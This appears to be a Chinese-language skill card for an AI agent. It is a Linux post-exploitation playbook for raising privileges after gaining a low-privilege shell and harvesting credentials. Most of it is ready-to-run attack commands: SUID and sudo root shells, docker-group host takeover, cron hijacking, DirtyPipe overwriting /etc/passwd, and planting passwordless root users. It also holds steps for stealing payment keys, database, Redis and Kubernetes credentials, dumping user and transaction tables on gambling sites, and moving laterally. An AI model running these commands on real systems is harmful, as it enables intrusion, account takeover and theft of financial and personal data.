---
name: 青丘
description: >-
 大爱仙尊·Skill: Linux 下阶后利用（提权 + 凭据收割）
---

# Linux 下阶后利用（提权 + 凭据收割）

## 触发条件

：
- 低权限 shell、拿到 shell 后怎么提权
- linux 提权、LPE、SUID、sudo 提权
- GTFOBins、capabilities、cron 提权
- 容器逃逸、docker 逃逸、lxd 提权
- 收割凭据、读取密钥、env 密钥
- DirtyPipe、nf_tables、SCTPhantom
- 容器逃逸 / docker / lxd（旧名 `container-escape-techniques` 已并入）
- Vue C2 内存沙箱 / gvisor / `/api/sandbox/exec`（认面先 `c2-zero-trust-console`）
- 授权多机 C2 舰队 / botnet 演练（先 `authorized-botnet-lab`，再回本卡做 Linux 维持）

## 真源手法卡（先读）

| 卡 | 路径 |
|----|------|
| 提权分流总卡 | `传承/反客·总诀.md` |
| Linux 主机 LPE | `传承/反客为主.md` |
| 容器逃逸 | `传承/瓮中逃.md` |
| K8s 特权 Pod | `传承/群瓮·特权.md` |
| Windows 提权 | `传承/反客为主-窗府.md` |
| 检测器 | `炼蛊房/linux_lpe_checker.py` · `炼蛊房/windows_lpe_checker.py` |

应用面提权（GVA/代理/JWT，无 shell）走 `反客·总诀.md` §2，勿与本 Skill 混。

---

## 第一步：立即执行的命令（拿到 shell 后 30 秒内）

```bash
# 1. 确认身份和环境
id; hostname; uname -a; cat /etc/os-release

# 2. 看有无直接 root 路径
sudo -l 2>/dev/null # NOPASSWD 规则
find / -perm -4000 -type f 2>/dev/null | head -20 # SUID 文件
groups # 高权限组（docker/lxd）

# 3. 读敏感文件（数据库密码、密钥）
env | grep -iE "key|secret|pass|token|ak|sk"
cat /proc/1/environ 2>/dev/null | tr '\0' '\n'
ls -ld /bin /sbin /usr/bin; readlink -f /bin /sbin
ls -l /www/server/panel/data/default.db 2>/dev/null # 可读则走宝塔卡 §3.1，勿 cat 整库
find /app /opt /srv /home -name ".env" -o -name "application*.yml" 2>/dev/null | xargs cat 2>/dev/null

# 4. 全面扫描（传脚本到目标执行）
python3 炼蛊房/linux_lpe_checker.py --out /tmp/lpe_$(hostname).json
```

---

## 第二步：使用提权检测工具

```bash
# 全部检查（CVE + 本地配置）
python3 炼蛊房/linux_lpe_checker.py

# 只看本地配置错误（SUID/sudo/cron/docker 等）
python3 炼蛊房/linux_lpe_checker.py --local-only

# 只看 CVE 内核漏洞
python3 炼蛊房/linux_lpe_checker.py --cve-only

# JSON 输出（方便后续分析）
python3 炼蛊房/linux_lpe_checker.py --json --out /tmp/lpe.json
```

---

## 第三步：按向量利用

### SUID GTFOBins（最速）

```bash
# 发现危险 SUID 后，查 GTFOBins
find / -perm -4000 -type f 2>/dev/null

# 常见利用示例：
python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")' # python SUID
find . -exec /bin/sh -p \; -quit # find SUID
vim -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")' # vim SUID
# 更多：https://gtfobins.github.io
```

### sudo NOPASSWD（最干净）

```bash
sudo -l # 查看规则
sudo bash # 如果有 ALL
sudo python3 -c 'import os; os.system("/bin/bash")'
sudo find /etc -exec bash \;
```

### Docker 组提权

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# 执行后：在 /mnt 里就是宿主机根目录，可以：
echo 'hacker::0:0:root:/root:/bin/bash' >> /mnt/etc/passwd
```

### Cron 脚本劫持

```bash
# 找 root 执行的 cron 脚本
crontab -l 2>/dev/null; cat /etc/crontab; ls /etc/cron*
# 如果脚本可写：
echo 'chmod +s /bin/bash' >> /path/to/cron_script.sh
# 等 cron 执行后：
bash -p # 获得 root bash
```

### Linux Capabilities

```bash
getcap -r / 2>/dev/null
# cap_setuid+ep on python：
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
# cap_sys_admin：挂载、卸载，可逃逸容器
```

### CVE-2026-64564（SCTPhantom，有低权限 shell）

```bash
# 检查 SCTP 模块
lsmod | grep sctp || modprobe sctp
# PoC：发送特定 ASCONF chunk 序列触发 UAF → root
# 已在 Debian 13/Rocky9/Ubuntu 24.04 验证
# 工具：炼蛊房/linux_lpe_checker.py --cve-only
```

### DirtyPipe（内核 5.8-5.16.11）

```bash
# 覆盖任意只读文件（如 /etc/passwd）
echo 'root::0:0:root:/root:/bin/bash' > /tmp/newpasswd
# 用 DirtyPipe PoC 覆盖 /etc/passwd
./dirtypipe /etc/passwd 1 $'\nroot::0:0:root:/root:/bin/bash\n'
su root # 空密码登录
```

---

## 第四步：博彩站场景的凭据收割

```bash
# 支付密钥（最高价值）
grep -r -il "appid\|mchid\|apikey\|notifyurl\|paykey\|channel_secret" \
 /opt /app /srv /www /home 2>/dev/null

# Spring Boot 应用配置
find / -name "application*.properties" -o -name "application*.yml" 2>/dev/null
# 关注：spring.datasource / alipay / wechatpay / crypto.key

# 数据库密码 → 直连 → 找 users/orders/transactions
mysql -h DB_HOST -u USER -p'PASS' DB_NAME -e "select * from users limit 10"

# Redis 密码（无密码的更多）
redis-cli -h REDIS_HOST INFO | head
redis-cli -h REDIS_HOST KEYS "*session*" | head

# 容器/K8s 里的 serviceaccount token
cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null
env | grep KUBERNETES

# Spring Boot heapdump（含内存中的密钥）
curl -sk http://localhost:8080/actuator/heapdump -o /tmp/heap.hprof
python3 炼蛊房/heap_cred_scan.py -f /tmp/heap.hprof
```

---

## 快速决策树

```
拿到 shell
 ├─ id = root? → 直接收割凭据
 └─ 低权限？
 ├─ sudo -l 有 NOPASSWD? → sudo bash/python 提权
 ├─ 在容器内 / docker.sock? → 瓮中逃
 ├─ K8s SA token? → 群瓮·特权（建 Pod 授权内直接做）
 ├─ 在 docker 组? → docker run 提权
 ├─ SUID 危险二进制? → GTFOBins 提权
 ├─ 内核版本受影响? → CVE exploit
 ├─ cron 可写脚本 / crontab PATH 可写？ → PATH 劫持（先看 symlink）
 ├─ 宝塔 /www/server/panel？ → default.db + 本机 MySQL 弱口（百万拖号先问）
 ├─ /etc/passwd 可写? → 写 root 用户
 └─ 均不可？→ 读 env/配置/历史命令找凭据
 → 尝试横向到其他机器
```
